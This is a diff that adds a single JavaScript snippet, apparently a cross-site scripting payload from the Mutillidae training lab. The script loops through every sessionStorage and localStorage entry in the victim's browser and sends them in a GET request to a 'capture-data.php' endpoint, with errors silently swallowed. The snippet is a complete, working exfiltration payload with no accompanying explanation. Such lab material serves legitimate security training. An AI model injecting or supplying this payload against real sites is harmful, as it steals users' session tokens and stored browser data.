@@ -1,0 +1,31 @@
+<script>
+
+	try{ 
+
+		var s = sessionStorage; var l = localStorage; var m = ""; var lXMLHTTP;		
+
+		for(i=0;i<s.length;i++){
+
+			m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + "; ";
+
+		}
+
+		for(i=0;i<l.length;i++){
+
+			m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + "; ";
+
+		}
+
+		var lAction = "http://mutillidae.local/capture-data.php?html5storage=" + m; 
+
+		lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; 
+
+		lXMLHTTP.open("GET", lAction); 
+
+		lXMLHTTP.send(""); 
+
+	}catch(e){} 
+
+</script>
+
+
